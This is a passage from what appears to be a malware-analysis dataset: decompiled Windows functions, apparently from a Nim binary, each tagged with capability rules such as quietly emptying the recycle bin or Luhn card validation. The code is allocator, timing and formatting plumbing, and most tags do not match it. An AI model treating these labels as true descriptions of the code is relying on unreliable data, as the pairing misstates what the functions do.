*0x1400dc9f0 = 2;\n        *0x1400dc7e0 = 8;\n        *0x1400dc7e8 = 8;\n        *0x1400dc7f0 = 0x16;\n        *0x1400dc9c0 = 1;\n        *0x1400dc9d0 = 0x1400dc7e0;\n        *0x1400dc9d8 = \"Field1\";\n        *0x1400dc988 = 0x1400dc8a0;\n        *0x1400dc8e0 = 0x1400dc960;\n        *0x1400dc940 = 0x1400dc8c0;\n        *0x1400dc948 = \"zonedTimeFromTimeImpl\";\n        *0x1400dca30 = 0x1400dc8c0;\n        *0x1400dca38 = \"zonedTimeFromAdjTimeImpl\";\n        *0x1400dca90 = 0x1400dca50;\n        *0x1400dc928 = 0x1400dca80;\n        *0x1400dcac0 = 0x1400dc900;\n        *0x1400dcbe0 = 0x1400dcb80;\n        *0x1400dca88 = 0x1400dca20;\n        *0x1400dc9c8 = 8;\n        *0x1400dc980 = 2;\n        *0x1400dc960 = 2;\n        *0x1400dc930 = 1;\n        *0x1400dc938 = 0;\n        *0x1400dca20 = 1;\n        *0x1400dca28 = 0x10;\n        *0x1400dca50 = 1;\n        *0x1400dca58 = 0x20;\n        *0x1400dca60 = 0x1400dcae0;\n        *0x1400dca68 = \"name\";\n        *0x1400dc920 = 3;\n        *0x1400dc900 = 2;\n        *0x1400dcbc0 = 0x30;\n        *0x1400dcbc8 = 8;\n        *0x1400dcbd0 = 0x11;\n        *0x1400dcbd8 = 0x1400dd5a0;\n        *0x1400dcba0 = 0;\n        *0x1400dcb80 = 2;\n        *0x1400dcb40 = 8;\n        *0x1400dcb58 = 0x1400dcbc0;\n        *0x1400dcb48 = 8;\n        *0x1400dcb50 = 0x16;\n        *0x1400dcb70 = 0x140005832;\n        *0x1400dcb30 = fcn.140002d6a(0x14001d9e0);\n        if (*0x1400dcb30 != 0) break;\n        iVar1 = 0x14001d9c0;\n    }\n    *0x1400dcb28 = fcn.140002ea9(*0x1400dcb30, \"MultiByteToWideChar\");\n    *0x1400dcb20 = fcn.140002ea9(*0x1400dcb30, \"WideCharToMultiByte\");\n    *0x1400dcf78 = 0x1400dcf20;\n    *0x1400dcee0 = 0x1400dcdb0;\n    *0x1400dcdc0 = 0x1400dcd40;\n    *0x1400dcdc8 = \"bCryptGenRandom\";\n    *0x1400dcee8 = 0x1400dcde0;\n    *0x1400dcdf0 = 0x1400dcd00;\n    *0x1400dcdf8 = \"queryProcessCycleTime\";\n    *0x1400dcef0 = 0x1400dce10;\n    *0x1400dce20 = 0x1400dccc0;\n    *0x1400dce28 = \"queryUnbiasedInterruptTime\";\n    *0x1400dcf60 = 0x38;\n    *0x1400dcf68 = 8;\n    *0x1400dcf70 = 0x111;\n    *0x1400dcd58 = 0;\n    *0x1400dcd40 = 8;\n    *0x1400dcd48 = 8;\n    *0x1400dcd50 = 0x319;\n    *0x1400dcdb0 = 1;\n    *0x1400dcdb8 = 8;\n    *0x1400dcd18 = 0;\n    *0x1400dcd00 = 8;\n    *0x1400dcd08 = 8;\n    *0x1400dcd10 = 0x319;\n    *0x1400dcde0 = 1;\n    *0x1400dcde8 = 0x10;\n    *0x1400dccd8 = 0;\n    *0x1400dccc0 = 8;\n    *0x1400dccc8 = 8;\n    *0x1400dccd0 = 0x319;\n    *0x1400dce10 = 1;\n    *0x1400dce18 = 0x18;\n    *0x1400dcef8 = 0x1400dce40;\n    *0x1400dce50 = 0x1400dcc80;\n    *0x1400dce58 = \"queryIdleProcessorCycleTime\";\n    *0x1400dcf00 = 0x1400dce70;\n    *0x1400dce80 = 0x1400dcc40;\n    *0x1400dce88 = \"coresCount\";\n    *0x1400dcf08 = 0x1400dcea0;\n    *0x1400dceb0 = 0x1400dcc00;\n    *0x1400dceb8 = \"hIntel\";\n    *0x1400dcda8 = 0x1400dcee0;\n    *0x1400dcf80 = 0x1400dcd80;\n    *0x1400dcff8 = 0x1400dcfa0;\n    *0x1400dd010 = 0x140001d27;\n    *0x1400dcc98 = 0;\n    *0x1400dcc80 = 8;\n    *0x1400dcc88 = 8;\n    *0x1400dcc90 = 0x319;\n    *0x1400dce40 = 1;\n    *0x1400dce48 = 0x20;\n    *0x1400dce70 = 1;\n    *0x1400dce78 = 0x28;\n    *0x1400dcc18 = 0;\n    *0x1400dcc00 = 8;\n    *0x1400dcc08 = 8;\n    *0x1400dcc10 = 0x328;\n    *0x1400dcea0 = 1;\n    *0x1400dcea8 = 0x30;\n    *0x1400dcda0 = 6;\n    *0x1400dcd80 = 2;\n    *0x1400dcfe0 = 8;\n    *0x1400dcfe8 = 8;\n    *0x1400dcff0 = 0x18;\n    (*pcStack56)();\n    pcStack64 = 0x14000808b;\n    fcn.14000156a(&stack0xffffffffffffffc0);\n    (*pcStack64)();\n    return 0;\n}\n",
        "token_count": 6362
    },
    "140004e3": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.140004e35(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    \n    uVar3 = *(arg1 + -0x10) - 8;\n    *(arg1 + -0x10) = uVar3;\n    puVar1 = arg1 + -0x10;\n    if (7 < uVar3) {\n        return;\n    }\n    if ((*puVar1 & 4) == 0) {\n        *puVar1 = *puVar1 | 4;\n        if (*0x1400eb300 <= *0x1400eb2f8) {\n            *0x1400eb300 = (*0x1400eb300 * 3) / 2;\n            iVar2 = fcn.1400029cb(0x1400eb348, *0x1400eb300 * 8 + 0x10);\n            puVar5 = *0x1400eb308;\n            *(iVar2 + 8) = 1;\n            puVar6 = iVar2 + 0x10;\n            for (iVar4 = *0x1400eb2f8 * 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            fcn.140004d89(*0x1400eb308);\n            *0x1400eb308 = iVar2 + 0x10;\n        }\n        *(*0x1400eb308 + *0x1400eb2f8 * 8) = puVar1;\n        *0x1400eb2f8 = *0x1400eb2f8 + 1;\n        return;\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "140004e5": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.140004e55(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    if (arg2 != 0) {\n        *(arg2 + -0x10) = *(arg2 + -0x10) + 8;\n    }\n    iVar1 = *arg1;\n    if (iVar1 != 0) {\n        uVar2 = *(iVar1 + -0x10) - 8;\n        *(iVar1 + -0x10) = uVar2;\n        if (uVar2 < 8) {\n            fcn.140004e21(0x1400eb2f8, iVar1 + -0x10);\n        }\n    }\n    *arg1 = arg2;\n    return;\n}\n",
        "token_count": 179
    },
    "140004ea": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.140004ea2(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    \n    uVar1 = *arg1;\n    *arg1 = uVar1 - 8;\n    if (7 < uVar1 - 8) {\n        return;\n    }\n    if ((*arg1 & 4) == 0) {\n        *arg1 = *arg1 | 4;\n        if (*0x1400eb300 <= *0x1400eb2f8) {\n            *0x1400eb300 = (*0x1400eb300 * 3) / 2;\n            iVar2 = fcn.1400029cb(0x1400eb348, *0x1400eb300 * 8 + 0x10);\n            puVar4 = *0x1400eb308;\n            *(iVar2 + 8) = 1;\n            puVar5 = iVar2 + 0x10;\n            for (iVar3 = *0x1400eb2f8 * 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.140004d89(*0x1400eb308);\n            *0x1400eb308 = iVar2 + 0x10;\n        }\n        *(*0x1400eb308 + *0x1400eb2f8 * 8) = arg1;\n        *0x1400eb2f8 = *0x1400eb2f8 + 1;\n        return;\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "140005e2": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint64_t * fcn.140005e2e(uint64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t *arg2_00;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t **ppuVar4;\n    uint64_t *puVar5;\n    \n    fcn.140005984();\n    arg2_00 = fcn.1400029cb(0x1400eb348, arg2 + 0x10);\n    iVar1 = *0x1400eb308;\n    arg2_00[1] = arg1;\n    *arg2_00 = 4;\n    if (*0x1400eb2f8 < 9) {\n        *(iVar1 + *0x1400eb2f8 * 8) = arg2_00;\n        *0x1400eb2f8 = *0x1400eb2f8 + 1;\n    }\n    else {\n        iVar2 = *0x1400eb2f8 * 8;\n        ppuVar4 = iVar1 + -8 + iVar2;\n        puVar5 = *ppuVar4;\n        uVar3 = *puVar5;\n        if (uVar3 < 8) {\n            ppuVar4 = iVar1 + -0x10 + iVar2;\n            puVar5 = *ppuVar4;\n            uVar3 = *puVar5;\n            if (uVar3 < 8) {\n                ppuVar4 = iVar1 + -0x18 + iVar2;\n                puVar5 = *ppuVar4;\n                uVar3 = *puVar5;\n                if (uVar3 < 8) {\n                    ppuVar4 = iVar1 + -0x20 + iVar2;\n                    puVar5 = *ppuVar4;\n                    uVar3 = *puVar5;\n                    if (uVar3 < 8) {\n                        ppuVar4 = iVar1 + -0x28 + iVar2;\n                        puVar5 = *ppuVar4;\n                        uVar3 = *puVar5;\n                        if (uVar3 < 8) {\n                            ppuVar4 = iVar1 + -0x30 + iVar2;\n                            puVar5 = *ppuVar4;\n                            uVar3 = *puVar5;\n                            if (uVar3 < 8) {\n                                ppuVar4 = iVar1 + -0x38 + iVar2;\n                                puVar5 = *ppuVar4;\n                                uVar3 = *puVar5;\n                                if (uVar3 < 8) {\n                                    ppuVar4 = iVar1 + -0x40 + iVar2;\n                                    puVar5 = *ppuVar4;\n                                    uVar3 = *puVar5;\n                                    if (uVar3 < 8) {\n                                        fcn.140004d99(0x1400eb2f8, arg2_00);\n                                    }\n                                    else {\n                                        *puVar5 = uVar3 & 0xfffffffffffffffb;\n                                        *ppuVar4 = arg2_00;\n                                    }\n                                    goto code_r0x000140005f3b;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        *puVar5 = uVar3 & 0xfffffffffffffffb;\n        *ppuVar4 = arg2_00;\n    }\ncode_r0x000140005f3b:\n    return arg2_00 + 2;\n}\n",
        "token_count": 762
    },
    "140005f4": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.140005f46(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    \n    iVar2 = 7;\n    if (6 < arg1) {\n        iVar2 = arg1;\n    }\n    puVar1 = fcn.140005e2e(0x14001b020, iVar2 + 0x11);\n    puVar1[1] = iVar2;\n    *puVar1 = 0;\n    return;\n}\n",
        "token_count": 109
    },
    "14000637": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.14000637b(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    \n    iVar2 = 7;\n    if (6 < arg1) {\n        iVar2 = arg1;\n    }\n    puVar1 = fcn.140006146(0x14001b020, iVar2 + 0x11);\n    puVar1[1] = iVar2;\n    *puVar1 = 0;\n    return;\n}\n",
        "token_count": 107
    },
    "140006ba": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140006cda: Changing call to branch\n\nvoid fcn.140006ba1(ulong arg1)\n\n{\n    int64_t *piVar1;\n    ulong *arg1_00;\n    ulong uVar2;\n    int64_t iVar3;\n    char **ppcVar4;\n    ulong *arg1_01;\n    uint64_t uVar5;\n    char *unaff_RBX;\n    uchar *puVar6;\n    ulong *puVar7;\n    uchar auStack72 [32];\n    ulong uStack40;\n    \n    puVar6 = &stack0xffffffffffffffb8;\n    arg1_00 = fcn.140006146(0x1400eb2a0, 0x30);\n    *arg1_00 = 0x1400eb260;\n    iVar3 = arg1_00[3];\n    arg1_00[2] = \"IOError\";\n    uVar2 = fcn.140005dc7(arg1);\n    arg1_00[3] = uVar2;\n    if (iVar3 != 0) {\n        fcn.140004e35(iVar3);\n    }\n    fcn.140004e55(arg1_00 + 1, 0);\n    uStack40 = 0x99;\n    fcn.140006a95(arg1_00, \"IOError\");\n    while( true ) {\n        *(puVar6 + -8) = arg1_00;\n        *(puVar6 + -0x10) = unaff_RBX;\n        *(puVar6 + -0x50) = 0x140006c43;\n        arg1_00 = fcn.140006146(0x1400e44a0, 0x30);\n        *arg1_00 = 0x1400e4460;\n        iVar3 = arg1_00[3];\n        arg1_00[2] = \"OverflowDefect\";\n        *(puVar6 + -0x50) = 0x140006c6e;\n        uVar2 = fcn.140005dc7(0x1400d6480);\n        arg1_00[3] = uVar2;\n        if (iVar3 != 0) {\n            *(puVar6 + -0x50) = 0x140006c81;\n            fcn.140004ea2(iVar3 + -0x10);\n        }\n        *(puVar6 + -0x28) = 0x36;\n        unaff_RBX = \"OverflowDefect\";\n        *(puVar6 + -0x50) = 0x140006ca7;\n        arg1_01 = arg1_00;\n        fcn.140006a95(arg1_00, \"OverflowDefect\");\n        *(puVar6 + -0x50) = iVar3;\n        piVar1 = arg1_01[3];\n        iVar3 = piVar1[1];\n        uVar5 = 0x10;\n        if (iVar3 != 0) {\n            uVar5 = iVar3 + 0xfU & -iVar3;\n        }\n        iVar3 = unaff_RBX * *piVar1;\n        if ((SEXT816(iVar3) == SEXT816(unaff_RBX) * SEXT816(*piVar1)) && (!SCARRY8(uVar5, iVar3))) break;\n        puVar7 = puVar6 + -0x78;\n        puVar6 = puVar6 + -0x78;\n        *puVar7 = 0x140006cdf;\n    }\n    *(puVar6 + -0x78) = 0x140006ce4;\n    ppcVar4 = fcn.140006146(arg1_01, uVar5 + iVar3);\n    *ppcVar4 = unaff_RBX;\n    ppcVar4[1] = unaff_RBX;\n    return;\n}\n",
        "token_count": 860
    },
    "1400116a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint64_t fcn.1400116a0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iStack24;\n    int64_t iStack16;\n    \n    iVar3 = *arg1;\n    if (*arg1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_QueryPerformanceFrequency)(&iStack24);\n        if (iVar1 == 0) {\n            *arg1 = -1;\n            goto code_r0x0001400116c4;\n        }\n        *arg1 = iStack24;\n        iVar3 = iStack24;\n    }\n    if (0 < iVar3) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&iStack16);\n        if (iVar1 != 0) {\n            return iStack16 / (*arg1 / 1000);\n        }\n    }\ncode_r0x0001400116c4:\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    return uVar2;\n}\n",
        "token_count": 242
    },
    "1400117c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.1400117c0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    uVar3 = *arg1 * 1000 + (*(arg1 + 1) + 999999) / 1000000;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack16);\n    uVar2 = ((uStack12 << 0x20) + uStack16 + 0xfe624e212ac18000) / 10000;\n    iVar1 = uVar3 - uVar2;\n    if (uVar3 < uVar2) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 186
    },
    "14001185": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.140011850(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    ulong uStack48;\n    \n    uStack48 = 0;\n    if (0xfffffffd < arg2 - 1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n        return iVar2;\n    }\n    iVar3 = fcn.1400116a0(&uStack48);\n    pcVar1 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n    uVar4 = arg2;\n    uVar5 = uVar4 + iVar3;\n    while( true ) {\n        iVar2 = (*pcVar1)(arg1, uVar4);\n        if (iVar2 != 0x102) {\n            return iVar2;\n        }\n        uVar4 = fcn.1400116a0(&uStack48);\n        if (uVar5 <= uVar4) break;\n        uVar4 = uVar5 - uVar4;\n    }\n    return 0x102;\n}\n",
        "token_count": 261
    },
    "1400118f": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.1400118f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    ulong uStack64;\n    \n    uStack64 = 0;\n    if (arg4 - 1 < 0xfffffffe) {\n        iVar3 = fcn.1400116a0(&uStack64);\n        pcVar1 = _sym.imp.KERNEL32.dll_WaitForMultipleObjects;\n        uVar4 = arg4;\n        uVar5 = uVar4 + iVar3;\n        while (iVar2 = (*pcVar1)(arg1, arg2, arg3, uVar4),  iVar2 == 0x102) {\n            uVar4 = fcn.1400116a0(&uStack64);\n            if (uVar5 <= uVar4) {\n                return 0x102;\n            }\n            uVar4 = uVar5 - uVar4;\n        }\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)();\n    }\n    return iVar2;\n}\n",
        "token_count": 271
    },
    "140014c5": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.140014c50(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    \n    fcn.14001a180(arg1);\n    uVar1 = fcn.1400168d0(0x6000, arg1, 0, arg2);\n    fcn.14001a1f0(arg1);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "140015a9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.140015a90(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *arg1_00;\n    uint64_t arg2;\n    uchar *puVar5;\n    uchar *puVar6;\n    ulong auStack96 [5];\n    uchar auStack56 [6];\n    uint16_t uStack50;\n    ulong uStack48;\n    ulong var_8h;\n    \n    if (*(arg1 + 0x14) == -3) {\n        uStack48 = 0;\n        auStack96[0] = 0x140015ba1;\n        puVar4 = sub.msvcrt.dll_localeconv();\n        arg1_00 = &stack0xffffffffffffffce;\n        auStack96[0] = 0x140015bb6;\n        iVar1 = fcn.140019d80(arg1_00, *puVar4, 0x10, &stack0xffffffffffffffd0);\n        if (iVar1 < 1) {\n            uStack50 = *(arg1 + 3);\n        }\n        else {\n            *(arg1 + 3) = uStack50;\n        }\n        *(arg1 + 0x14) = iVar1;\n    }\n    else {\n        uStack50 = *(arg1 + 3);\n        arg1_00 = arg1;\n    }\n    arg2 = uStack50;\n    if (uStack50 == 0) {\n        auStack96[0] = 0x140015b7d;\n        fcn.140014dc0(0x2e, arg1);\n        return;\n    }\n    auStack96[0] = 0x140015ace;\n    iVar3 = fcn.14000ae90(arg1_00);\n    iVar3 = -iVar3;\n    uStack48 = 0;\n    *(&stack0xffffffffffffffa0 + iVar3) = 0x140015aea;\n    iVar1 = fcn.140019ff0(&stack0xffffffffffffffc8 + iVar3, arg2);\n    if (iVar1 < 1) {\n        *(&stack0xffffffffffffffa0 + iVar3) = 0x140015bdd;\n        fcn.140014dc0(0x2e, arg1);\n    }\n    else {\n        puVar5 = &stack0xffffffffffffffc8 + iVar3;\n        do {\n            while( true ) {\n                puVar6 = puVar5 + 1;\n                if (((*(arg1 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg1 + 0x24),  *(arg1 + 5) != iVar2 && iVar2 <= *(arg1 + 5))) break;\ncode_r0x000140015b0e:\n                *(arg1 + 0x24) = iVar2 + 1;\n                puVar5 = puVar6;\n                if (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 == puVar6) {\n                    return;\n                }\n            }\n            if ((*(arg1 + 1) & 0x2000) == 0) {\n                *(*arg1 + *(arg1 + 0x24)) = *puVar5;\n                iVar2 = *(arg1 + 0x24);\n                goto code_r0x000140015b0e;\n            }\n            *(&stack0xffffffffffffffa0 + iVar3) = 0x140015b4a;\n            sub.msvcrt.dll_fputc();\n            *(arg1 + 0x24) = *(arg1 + 0x24) + 1;\n            puVar5 = puVar6;\n        } while (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 != puVar6);\n    }\n    return;\n}\n",
        "token_count": 868
    },
    "140019ff": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140019ff0(uchar *arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack29 [5];\n    \n    if (arg1 == NULL) {\n        arg1 = auStack29;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = sub.msvcrt.dll____lc_codepage_func();\n    iVar3 = fcn.140019f60(arg1, arg2 & 0xffff, uVar2, uVar1);\n    return iVar3;\n}\n",
        "token_count": 142
    },
    "140015fa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140015fa0(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint64_t arg1_00;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    ulong uStack64;\n    \n    iVar10 = 1;\n    arg3._0_4_ = arg3 + -1;\n    arg1_00 = arg3;\n    while (arg3._0_4_ = arg3 / 10,  arg3 != 0) {\n        iVar10 = iVar10 + 1;\n    }\n    iVar4 = *(arg4 + 0x2c);\n    if (iVar4 == -1) {\n        *(arg4 + 0x2c) = 2;\n        iVar4 = 2;\n    }\n    if (iVar10 <= iVar4) {\n        iVar10 = iVar4;\n    }\n    iVar4 = *(arg4 + 0xc) - (iVar10 + 2);\n    if (*(arg4 + 0xc) <= iVar10 + 2) {\n        iVar4 = -1;\n    }\n    *(arg4 + 0xc) = iVar4;\n    uStack64 = 0x14001603a;\n    fcn.140015bf0(arg1, arg2, 1, arg4);\n    uVar11 = *(arg4 + 1);\n    *(arg4 + 2) = *(arg4 + 0x2c);\n    *(arg4 + 1) = uVar11 | 0x1c0;\n    uStack64 = 0x140016063;\n    fcn.140014dc0(uVar11 & 0x20 | 0x45, arg4);\n    *(arg4 + 0xc) = *(arg4 + 0xc) + iVar10 + 1;\n    iVar10 = *(arg4 + 2);\n    uVar11 = *(arg4 + 1);\n    iVar4 = *(arg4 + 0xc);\n    auStack112[0] = 0x14001574a;\n    iVar5 = fcn.14000ae90(arg1_00);\n    iVar5 = -iVar5;\n    pcVar3 = &stack0xffffffffffffffb8 + iVar5;\n    if ((uVar11 & 0x80) == 0) {\ncode_r0x000140015769:\n        if (arg1_00 != 0) goto code_r0x000140015772;\n        pcVar7 = pcVar3;\n        pcVar8 = pcVar3;\n        iVar9 = iVar10;\n        if (0 < iVar10) goto code_r0x00014001581a;\ncode_r0x0001400159b9:\n        if (iVar10 == 0) goto code_r0x000140015839;\n    }\n    else {\n        if (-1 < arg1_00) {\n            uVar11 = uVar11 & 0xffffff7f;\n            *(arg4 + 1) = uVar11;\n            goto code_r0x000140015769;\n        }\n        arg1_00 = -arg1_00;\ncode_r0x000140015772:\n        pcVar8 = pcVar3;\n        while( true ) {\n            pcVar7 = pcVar8;\n            pcVar8 = pcVar7 + 1;\n            uVar6 = arg1_00 / 10;\n            *pcVar7 = arg1_00 + uVar6 * -10 + '0';\n            if (arg1_00 < 10) break;\n            arg1_00 = uVar6;\n            if ((((pcVar3 != pcVar8) && ((uVar11 & 0x1000) != 0)) && (*(arg4 + 4) != 0)) &&\n               ((pcVar8 - pcVar3 & 0x8000000000000003U) == 3)) {\n                pcVar7[1] = ',';\n                pcVar8 = pcVar7 + 2;\n            }\n        }\n        if (iVar10 < 1) {\n            if (pcVar3 != pcVar8) goto code_r0x000140015839;\n            goto code_r0x0001400159b9;\n        }\n        iVar9 = iVar10 - (pcVar8 - pcVar3);\n        pcVar7 = pcVar8;\n        if (0 < iVar9) {\ncode_r0x00014001581a:\n            pcVar8 = pcVar7 + iVar9;\n            *(&stack0xffffffffffffff90 + iVar5) = 0x140015830;\n            sub.msvcrt.dll_memset(pcVar7, 0x30, iVar9);\n        }\n        if (pcVar3 != pcVar8) goto code_r0x000140015839;\n    }\n    *pcVar8 = '0';\n    pcVar8 = pcVar8 + 1;\ncode_r0x000140015839:\n    pcVar7 = pcVar8;\n    if (0 < iVar4) {\n        iVar4 = iVar4 - (pcVar8 - pcVar3);\n        *(arg4 + 0xc) = iVar4;\n        if (0 < iVar4) {\n            if ((uVar11 & 0x1c0) != 0) {\n                *(arg4 + 0xc) = iVar4 + -1;\n            }\n            if ((iVar10 < 0) && ((uVar11 & 0x600) == 0x200)) {\n                iVar10 = *(arg4 + 0xc);\n                uVar1 = iVar10 - 1;\n                *(arg4 + 0xc) = uVar1;\n                if (0 < iVar10) {\n                    iVar2 = uVar1 + 1;\n                    pcVar7 = pcVar8 + iVar2;\n                    *(&stack0xffffffffffffff90 + iVar5) = 0x140015a22;\n                    